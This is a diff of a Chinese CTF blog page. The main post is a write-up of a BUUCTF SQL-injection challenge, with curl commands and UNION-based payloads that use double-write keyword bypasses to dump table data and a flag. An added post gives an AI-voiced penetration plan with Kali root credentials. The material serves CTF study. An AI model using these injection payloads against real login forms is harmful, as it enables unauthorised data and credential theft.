-<li>闭合符号：由于后端代码常将变量使用单引号 <code>&#39;</code> 或双引号 <code>&quot;</code> 包裹，输入相同符号可提前闭合原语句。</li>
-<li>注释符：<code>--+</code> 或 <code>#</code> (在URL中需编码为 <code>%23</code>) 用于注释掉原 SQL 语句中后续的无用代码或密码验证部分。</li>
-</ul>
-</li>
+<li><strong>SQL注入</strong>：通过注入点绕过登录验证并执行任意 SQL 语句</li>
+<li><strong>双写绕过</strong>：后端对 <code>or</code>、<code>union</code>、<code>select</code>、<code>from</code>、<code>where</code> 等关键词进行了过滤（替换为空），但未做多次过滤，因此可以采用双写绕过</li>
+<li><strong>堆叠&#x2F;联合查询注入</strong>：使用 <code>UNION SELECT</code> 联合查询获取数据库中的表结构和数据</li>
 </ol>
-<h2 id="解题思路与详细步骤"><a href="#解题思路与详细步骤" class="headerlink" title="解题思路与详细步骤"></a>解题思路与详细步骤</h2><h3 id="1-探寻题目页面"><a href="#1-探寻题目页面" class="headerlink" title="1. 探寻题目页面"></a>1. 探寻题目页面</h3><p>首先访问网页，发现是一个名为 “用户登陆” 的简单表单，要求输入用户名和密码。<br>通过查看源码或者抓包发现，表单的数据通过 <code>GET</code> 方法发送到 <code>check.php</code>。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取网页源码验证请求方法</span></span><br><span class="line">curl -s <span class="string">&quot;http://4ad4c8ce-c976-43d3-b92b-0f71c0d7165e.node5.buuoj.cn:81/&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="解题思路与详细步骤"><a href="#解题思路与详细步骤" class="headerlink" title="解题思路与详细步骤"></a>解题思路与详细步骤</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h3><p>访问目标网址，是一个登录页面，包含用户名(username)和密码(password)两个输入框，表单提交到 <code>check.php</code>。页面提示：”自从前几次网站被日，我对我的网站做了严格的过滤，你们这些黑客死心吧！！！”，说明后端做了关键词过滤。</p>
+<p>使用单引号测试注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /check.php?username=admin&#x27;&amp;password=admin</span><br></pre></td></tr></table></figure>
+<p>返回 SQL 语法错误，确认存在 SQL 注入漏洞。</p>
+<h3 id="2-过滤规则探测"><a href="#2-过滤规则探测" class="headerlink" title="2. 过滤规则探测"></a>2. 过滤规则探测</h3><p>通过尝试不同关键词，观察返回结果（报错 vs 正常），发现以下关键词被过滤（替换为空）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># === SQL原文: SELECT * FROM users WHERE username=&#x27;$username&#x27; AND password=&#x27;$password&#x27; ===</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试 or 是否被过滤</span></span><br><span class="line"><span class="comment"># SQL: SELECT * FROM users WHERE username=&#x27;admin&#x27; or 1=1#&#x27; AND password=&#x27;admin&#x27;</span></span><br><span class="line"><span class="comment"># or 被过滤后: SELECT * FROM users WHERE username=&#x27;admin&#x27; 1=1#&#x27; AND password=&#x27;admin&#x27;  ← 语法错误</span></span><br><span class="line"><span class="comment"># or 未过滤:  SELECT * FROM users WHERE username=&#x27;admin&#x27; or 1=1#&#x27; AND password=&#x27;admin&#x27;  ← Login Success</span></span><br><span class="line">curl <span class="string">&quot;http://target/check.php?username=admin&#x27;%20or%201=1%23&amp;password=admin&quot;</span></span><br><span class="line"><span class="comment"># 返回语法错误 → or 被过滤</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 双写测试 oorr</span></span><br><span class="line"><span class="comment"># SQL: SELECT * FROM users WHERE username=&#x27;admin&#x27; oorr 1=1#&#x27; AND password=&#x27;admin&#x27;</span></span><br><span class="line"><span class="comment"># 过滤后:  SELECT * FROM users WHERE username=&#x27;admin&#x27; or 1=1#&#x27; AND password=&#x27;admin&#x27;  ← 语法正确</span></span><br><span class="line">curl <span class="string">&quot;http://target/check.php?username=admin&#x27;%20oorr%201=1%23&amp;password=admin&quot;</span></span><br><span class="line"><span class="comment"># Login Success → 双写绕过成功，确认 or 被过滤</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试 union/select 双写</span></span><br><span class="line"><span class="comment"># SQL: SELECT * FROM users WHERE username=&#x27;admin&#x27; union select 1,2,3#&#x27; AND password=&#x27;admin&#x27;</span></span><br><span class="line"><span class="comment"># 过滤后:  SELECT * FROM users WHERE username=&#x27;admin&#x27; 1,2,3#&#x27; AND password=&#x27;admin&#x27;  ← 语法错误</span></span><br><span class="line">curl <span class="string">&quot;http://target/check.php?username=admin&#x27;%20union%20select%201,2,3%23&amp;password=admin&quot;</span></span><br><span class="line"><span class="comment"># 报错 → union/select 被过滤</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SQL: SELECT * FROM users WHERE username=&#x27;admin&#x27; ununionion selselectect 1,2,3#&#x27;</span></span><br><span class="line"><span class="comment"># 过滤后:  SELECT * FROM users WHERE username=&#x27;admin&#x27; union select 1,2,3#&#x27;  ← 语法正确</span></span><br><span class="line">curl <span class="string">&quot;http://target/check.php?username=admin&#x27;%20ununionion%20selselectect%201,2,3%23&amp;password=admin&quot;</span></span><br><span class="line"><span class="comment"># 正常返回 → 双写绕过成功</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试 from 双写（information 中的 or 也需双写）</span></span><br><span class="line"><span class="comment"># SQL: SELECT * FROM users WHERE username=&#x27;1&#x27; union select 1,table_name,3 from information_schema.tables where#</span></span><br><span class="line"><span class="comment"># 过滤后:  SELECT * FROM users WHERE username=&#x27;1&#x27; union select 1,table_name,3  information_schema.tables   ← 语法错误</span></span><br><span class="line">curl <span class="string">&quot;http://target/check.php?username=1&#x27;%20ununionion%20selselectect%201,table_name,3%20frfromom%20infoorrmation_schema.tables%20whwhereere%201=1%23&amp;password=admin&quot;</span></span><br><span class="line"><span class="comment"># 正常返回 → from、where、information 中的 or 均被过滤，双写均可绕过</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试 where 双写</span></span><br><span class="line"><span class="comment"># SQL: SELECT * FROM users WHERE username=&#x27;admin&#x27; where 1=1#&#x27;</span></span><br><span class="line"><span class="comment"># 过滤后:  SELECT * FROM users WHERE username=&#x27;admin&#x27; 1=1#&#x27;  ← 语法错误</span></span><br><span class="line">curl <span class="string">&quot;http://target/check.php?username=admin&#x27;%20whwhereere%201=1%23&amp;password=admin&quot;</span></span><br><span class="line"><span class="comment"># 正常返回 → where 被过滤，双写 whwhereere 可绕过</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="2-构建注入-Payload"><a href="#2-构建注入-Payload" class="headerlink" title="2. 构建注入 Payload"></a>2. 构建注入 Payload</h3><p>后端查询语句通常的结构类似于：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>我们可以通过输入 <code>admin&#39; or 1=1 #</code> 作为用户名。带入后变成：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #<span class="string">&#x27; AND password = &#x27;</span>$password<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>这里 <code>1=1</code> 为永真，<code>#</code> 注释掉了后面的密码验证，从而实现无密码直接登录。</p>
-<h3 id="3-实战操作-Mac-Kali-环境"><a href="#3-实战操作-Mac-Kali-环境" class="headerlink" title="3. 实战操作 (Mac&#x2F;Kali 环境)"></a>3. 实战操作 (Mac&#x2F;Kali 环境)</h3><p>因为参数是通过 GET 传递的，我们可以直接用 curl 发送带 Payload 的请求。注意，在 URL 中单引号 <code>&#39;</code> 编码为 <code>%27</code>，空格可以用 <code>+</code> 或 <code>%20</code>，井号 <code>#</code> 编码为 <code>%23</code>。</p>
-<p><strong>方法一：在本地 Mac 终端中直接请求</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://4ad4c8ce-c976-43d3-b92b-0f71c0d7165e.node5.buuoj.cn:81/check.php?username=admin%27+or+1%3D1%23&amp;password=123&quot;</span></span><br></pre></td></tr></table></figure>
+<p>通过测试确认以下关键词被过滤（替换为空）：</p>
+<ul>
+<li><code>or</code></li>
+<li><code>union</code></li>
+<li><code>select</code></li>
+<li><code>from</code></li>
+<li><code>where</code></li>
+</ul>
+<h3 id="3-双写绕过技巧"><a href="#3-双写绕过技巧" class="headerlink" title="3. 双写绕过技巧"></a>3. 双写绕过技巧</h3><p>后端使用类似 <code>str_replace([&#39;or&#39;,&#39;union&#39;,&#39;select&#39;,&#39;from&#39;,&#39;where&#39;], &#39;&#39;, $input)</code> 的过滤机制，但只过滤一次。因此可以双写关键词，过滤掉中间的部分后剩下的正好构成原词：</p>
+<table>
+<thead>
+<tr>
+<th>原始词</th>
+<th>双写形式</th>
+<th>过滤后</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>or</code></td>
+<td><code>oorr</code></td>
+<td><code>or</code></td>
+</tr>
+<tr>
+<td><code>union</code></td>
+<td><code>ununionion</code></td>
+<td><code>union</code></td>
+</tr>
+<tr>
+<td><code>select</code></td>
+<td><code>selselectect</code></td>
+<td><code>select</code></td>
+</tr>
+<tr>
+<td><code>from</code></td>
+<td><code>frfromom</code></td>
+<td><code>from</code></td>
+</tr>
+<tr>
+<td><code>where</code></td>
+<td><code>whwhereere</code></td>
+<td><code>where</code></td>
+</tr>
+<tr>
+<td><code>information</code></td>
+<td><code>infoorrmation</code></td>
+<td><code>information</code></td>
+</tr>
+<tr>
+<td><code>password</code></td>
+<td><code>passwoorrd</code></td>
+<td><code>password</code></td>
+</tr>
+</tbody></table>
+<h3 id="4-确认注入成功"><a href="#4-确认注入成功" class="headerlink" title="4. 确认注入成功"></a>4. 确认注入成功</h3><p>使用 <code>oorr</code> 绕过登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /check.php?username=admin&#x27; oorr 1=1%23&amp;password=admin</span><br></pre></td></tr></table></figure>
+<p>返回 <code>Login Success!</code>，获取到 admin 用户的密码哈希 <code>e64a399a69cb527f23ed10d444dd8f61</code>，确认 SQL 注入成功。</p>
+<h3 id="5-确定列数"><a href="#5-确定列数" class="headerlink" title="5. 确定列数"></a>5. 确定列数</h3><p>使用联合查询 <code>union select</code> 依次递增列数测试，当列数正确时页面正常返回：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从1列开始试，直到不报错为止</span></span><br><span class="line">curl <span class="string">&quot;http://target/check.php?username=1&#x27;%20ununionion%20selselectect%201%23&amp;password=admin&quot;</span>     <span class="comment"># 报错</span></span><br><span class="line">curl <span class="string">&quot;http://target/check.php?username=1&#x27;%20ununionion%20selselectect%201,2%23&amp;password=admin&quot;</span>   <span class="comment"># 报错</span></span><br><span class="line">curl <span class="string">&quot;http://target/check.php?username=1&#x27;%20ununionion%20selselectect%201,2,3%23&amp;password=admin&quot;</span> <span class="comment"># 正常</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>方法二：通过 SSH 远程调用 Kali 机器验证</strong><br>利用配置好的 Kali 环境（密码 kali）发起请求：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshpass -p kali ssh -o StrictHostKeyChecking=no root@192.168.43.16 <span class="string">&#x27;curl -s &quot;http://4ad4c8ce-c976-43d3-b92b-0f71c0d7165e.node5.buuoj.cn:81/check.php?username=admin%27+or+1%3D1%23&amp;password=123&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>测试得出表为 <strong>3 列</strong>，且返回 <code>Hello 2！</code> 和 <code>Your password is &#39;3&#39;</code>，说明第 2 列显示在用户名位置，第 3 列显示在密码位置。</p>
+<h3 id="6-获取数据库信息"><a href="#6-获取数据库信息" class="headerlink" title="6. 获取数据库信息"></a>6. 获取数据库信息</h3><p>获取当前数据库名和版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">database() → geek</span><br><span class="line">version() → 10.3.18-MariaDB</span><br></pre></td></tr></table></figure>
 
-<h3 id="4-获得-Flag"><a href="#4-获得-Flag" class="headerlink" title="4. 获得 Flag"></a>4. 获得 Flag</h3><p>通过执行上述命令，服务器直接返回了登录成功的 HTML 页面，其中包含了隐藏的 Flag。</p>
-<p><strong>回显内容摘要：</strong></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&#x27;font-family:verdana;color:red;text-align:center;&#x27;</span>&gt;</span>Login Success!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&#x27;font-family:arial;color:#ffffff;font-size:30px;text-align:center;&#x27;</span>&gt;</span>flag&#123;ad7e1d43-b697-4d49-8d5e-4cc85681cbd7&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="7-获取表名"><a href="#7-获取表名" class="headerlink" title="7. 获取表名"></a>7. 获取表名</h3><p>查询 <code>information_schema.tables</code>，注意 <code>information</code> 中的 <code>or</code> 需要双写为 <code>infoorrmation</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /check.php?username=1&#x27; ununionion selselectect 1,table_name,3 frfromom infoorrmation_schema.tables whwhereere table_schema=database()%23&amp;password=admin</span><br></pre></td></tr></table></figure>
+<p>得到表名：<code>b4bsql</code></p>
+<h3 id="8-获取列名"><a href="#8-获取列名" class="headerlink" title="8. 获取列名"></a>8. 获取列名</h3><p>查询 <code>information_schema.columns</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /check.php?username=1&#x27; ununionion selselectect 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;b4bsql&#x27;%23&amp;password=admin</span><br></pre></td></tr></table></figure>
+<p>得到列名：<code>id</code>, <code>username</code>, <code>password</code></p>
+<h3 id="9-获取-Flag"><a href="#9-获取-Flag" class="headerlink" title="9. 获取 Flag"></a>9. 获取 Flag</h3><p>查询 <code>b4bsql</code> 表中所有数据，注意 <code>password</code> 中包含 <code>or</code> 也需要双写：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /check.php?username=1&#x27; ununionion selselectect 1,group_concat(username,&#x27;:&#x27;,passwoorrd),3 frfromom b4bsql%23&amp;password=admin</span><br></pre></td></tr></table></figure>
+<p>获取到数据：</p>
+<table>
+<thead>
+<tr>
+<th>用户名</th>
+<th>密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cl4y</td>
+<td>i_want_to_play_2077</td>
+</tr>
+<tr>
+<td>sql</td>
+<td>sql_injection_is_so_fun</td>
+</tr>
+<tr>
+<td>porn</td>
+<td>do_you_know_pornhub</td>
+</tr>
+<tr>
+<td>git</td>
+<td>github_is_different_from_pornhub</td>
+</tr>
+<tr>
+<td>Stop</td>
+<td>you_found_flag_so_stop</td>
+</tr>
+<tr>
+<td>badguy</td>
+<td>i_told_you_to_stop</td>
+</tr>
+<tr>
+<td>hacker</td>
+<td>hack_by_cl4y</td>
+</tr>
+<tr>
+<td><strong>flag</strong></td>
+<td><strong>flag{fcf209d6-8169-4cc3-b59f-cb43266b1e06}</strong></td>
+</tr>
+</tbody></table>
+<h2 id="最终-Flag"><a href="#最终-Flag" class="headerlink" title="最终 Flag"></a>最终 Flag</h2><p><code>flag{fcf209d6-8169-4cc3-b59f-cb43266b1e06}</code></p>
+<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><h3 id="双写绕过原理"><a href="#双写绕过原理" class="headerlink" title="双写绕过原理"></a>双写绕过原理</h3><p>当后端使用 <code>str_replace([&#39;or&#39;,&#39;union&#39;,&#39;select&#39;,&#39;from&#39;,&#39;where&#39;], &#39;&#39;, $input)</code> 等函数将危险关键词替换为空字符串时（且只执行一次过滤），攻击者可以通过双写来绕过。</p>
+<p><strong>核心理解：过滤器是按关键词子串匹配，不是按整个单词匹配。</strong> 它只查找输入中是否包含这些关键词片段，找到了就删掉。因此双写时只需要重复<strong>被过滤的那个关键词本身</strong>，而不是重复整个单词。</p>
+<p>以 <code>information</code> 为例，需要明确一点：<code>information</code> 本身不是过滤关键词，但它<strong>包含</strong>了过滤关键词 <code>or</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">information</span><br><span class="line">  ↑↑</span><br><span class="line">  └─ 过滤器的 `or` 在这里匹配到了</span><br></pre></td></tr></table></figure>
 
-<h2 id="最终-Flag"><a href="#最终-Flag" class="headerlink" title="最终 Flag"></a>最终 Flag</h2><p><code>flag{ad7e1d43-b697-4d49-8d5e-4cc85681cbd7}</code></p>
+<p>过滤过程：<code>information</code> &#x3D; <code>inf</code> + <code>or</code> + <code>mation</code>，中间的 <code>or</code> 被删掉 → 只剩 <code>infmation</code>（乱码）。</p>
+<p>双写时只需在 <code>or</code> 的位置重复一次：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">infoorrmation = inf + or + or + mation</span><br><span class="line">                     ↑_____↑</span><br><span class="line">                     过滤删掉中间的 or</span><br><span class="line">                     ↓</span><br><span class="line">               inf + or + mation = information  ✓</span><br></pre></td></tr></table></figure>
+
+<p>同理其他所有词：</p>
+<table>
+<thead>
+<tr>
+<th>单词</th>
+<th>包含的过滤关键词</th>
+<th>双写方式</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>select</code></td>
+<td><code>select</code></td>
+<td><code>sel</code>+<code>select</code>+<code>ect</code> &#x3D; <strong><code>selselectect</code></strong></td>
+<td>整体就是关键词，在中间插入一次</td>
+</tr>
+<tr>
+<td><code>union</code></td>
+<td><code>union</code></td>
+<td><code>un</code>+<code>union</code>+<code>ion</code> &#x3D; <strong><code>ununionion</code></strong></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><code>from</code></td>
+<td><code>from</code></td>
+<td><code>f</code>+<code>from</code>+<code>om</code> &#x3D; <strong><code>frfromom</code></strong></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><code>where</code></td>
+<td><code>where</code></td>
+<td><code>wh</code>+<code>where</code>+<code>ere</code> &#x3D; <strong><code>whwhereere</code></strong></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><code>order</code></td>
+<td><code>or</code>（包含在其中）</td>
+<td><code>or</code>+<code>or</code>+<code>der</code> &#x3D; <strong><code>oorrder</code></strong></td>
+<td>只双写 <code>or</code>，不是整体重复</td>
+</tr>
+<tr>
+<td><code>information</code></td>
+<td><code>or</code>（包含在其中）</td>
+<td><code>inf</code>+<code>or</code>+<code>or</code>+<code>mation</code> &#x3D; <strong><code>infoorrmation</code></strong></td>
+<td>只双写 <code>or</code></td>
+</tr>
+<tr>
+<td><code>password</code></td>
+<td><code>or</code>（包含在其中）</td>
+<td><code>passw</code>+<code>or</code>+<code>or</code>+<code>d</code> &#x3D; <strong><code>passwoorrd</code></strong></td>
+<td>只双写 <code>or</code></td>
+</tr>
+</tbody></table>
+<p><strong>一句话总结：看这个单词里哪个子串是被过滤的关键词，就把那个子串写两遍，剩下的部分不动。</strong></p>
+<h3 id="过滤词对数据字典的影响"><a href="#过滤词对数据字典的影响" class="headerlink" title="过滤词对数据字典的影响"></a>过滤词对数据字典的影响</h3><p>需要注意过滤词不仅影响 SQL 关键字，也影响数据字典中的字符串（表名、列名等）：</p>
+<ul>
+<li><code>information</code> 中的 <code>or</code> 会被过滤 → 需双写为 <code>infoorrmation</code></li>
+<li><code>password</code> 中的 <code>or</code> 会被过滤 → 需双写为 <code>passwoorrd</code></li>
+<li>同理，任何包含过滤关键词的表名&#x2F;列名都需要对应双写</li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/02/README/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/saber.jpg">
+      <meta itemprop="name" content="zhaochoudecat">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zhaochoudecat">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2026/05/02/README/" class="post-title-link" itemprop="url">AI CTF </a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-05-02 00:00:00" itemprop="dateCreated datePublished" datetime="2026-05-02T00:00:00+08:00">2026-05-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-05-03 03:58:35" itemprop="dateModified" datetime="2026-05-03T03:58:35+08:00">2026-05-03</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="AI-CTF"><a href="#AI-CTF" class="headerlink" title="AI CTF"></a>AI CTF</h1><p>作为CTF专家，我将协助你攻破目标靶机并获取两个flag文件（user.txt和root.txt）。以下是详细的攻击方案：</p>
+<ol>
+<li>环境准备阶段：</li>
+</ol>
+<ul>
+<li>本地使用Mac OS环境作为主操作平台</li>
+<li>备用方案：通过sshpass连接远程Kali环境（IP: 192.168.43.157，用户名root，密码kali）</li>
+<li>确认靶机IP地址：192.168.43.133</li>
+</ul>
+<ol start="2">
+<li>初始信息收集：</li>
+</ol>
+<ul>
+<li>使用nmap对靶机进行全端口扫描：<code>nmap -sV -p- 192.168.43.133</code></li>
+<li>识别开放的服务及其版本信息</li>
+<li>检查是否存在web服务，若有则进行目录扫描</li>
+</ul>
+<ol start="3">
+<li>攻击路径规划：</li>
+</ol>
+<ul>
+<li>根据扫描结果选择最可能突破的攻击向量</li>
+<li>优先尝试常见漏洞：SQL注入、命令注入、文件包含等</li>
+<li>建立初步立足点获取user权限</li>
+</ul>
+<ol start="4">
+<li>权限提升阶段：</li>
+</ol>
+<ul>
+<li>通过本地漏洞枚举寻找提权机会</li>
+<li>检查SUID文件、cron jobs、错误配置等</li>
+<li>最终获取root权限</li>
+</ul>
+<ol start="5">
+<li>Flag获取与验证：</li>
+</ol>
+<ul>
+<li>在用户目录查找并读取user.txt</li>
+<li>在root目录获取root.txt</li>
+<li>验证flag格式是否符合要求</li>
+</ul>
+<ol start="6">
+<li>报告撰写要求：</li>
+</ol>
+<ul>
+<li>创建my_ftc文件夹存放WP文档</li>
+<li>详细记录每个攻击步骤及对应命令</li>
+<li>包含漏洞原理说明和截图证据</li>
+<li>使用中文撰写完整的渗透测试报告</li>
+<li>报告结构需包含：目标概述、信息收集、漏洞利用、权限提升、总结反思</li>
+</ul>
+<ol start="7">
+<li>协作方式：</li>
+</ol>
+<ul>
+<li>实时同步攻击进展</li>
+<li>遇到困难时共同分析解决方案</li>
+<li>每个关键步骤执行前进行确认</li>
+</ul>
+<p>请先执行初始信息收集步骤，我将根据扫描结果指导后续攻击策略。</p>
 
       
     </div>
@@ -1375,277 +1950,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://zhaochoudecat.github.io/2026/05/03/%E9%9D%B6%E6%9C%BA/vulnhub/DC9/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/saber.jpg">
-      <meta itemprop="name" content="zhaochoudecat">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zhaochoudecat">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2026/05/03/%E9%9D%B6%E6%9C%BA/vulnhub/DC9/" class="post-title-link" itemprop="url">DC9</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2026-05-03 00:00:00 / 修改时间：04:03:51" itemprop="dateCreated datePublished" datetime="2026-05-03T00:00:00+08:00">2026-05-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶机</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA/vulnhub/" itemprop="url" rel="index"><span itemprop="name">vulnhub</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="1-探测"><a href="#1-探测" class="headerlink" title="1.探测"></a>1.探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/localkali/testpayload]</span><br><span class="line">└─# arp-scan -l             </span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:dc:17:7e, IPv4: 192.168.3.43</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.3.1     18:d9:8f:c8:68:38       Huawei Device Co., Ltd.</span><br><span class="line">192.168.3.4     00:e0:4c:4d:2a:68       REALTEK SEMICONDUCTOR CORP.</span><br><span class="line">192.168.3.5     b4:2e:99:cc:28:45       GIGA-BYTE TECHNOLOGY CO.,LTD.</span><br><span class="line">192.168.3.45    08:00:27:95:4e:a9       PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>
-
-<p><img src="/assets/Pasted%20image%2020260110175100.png"></p>
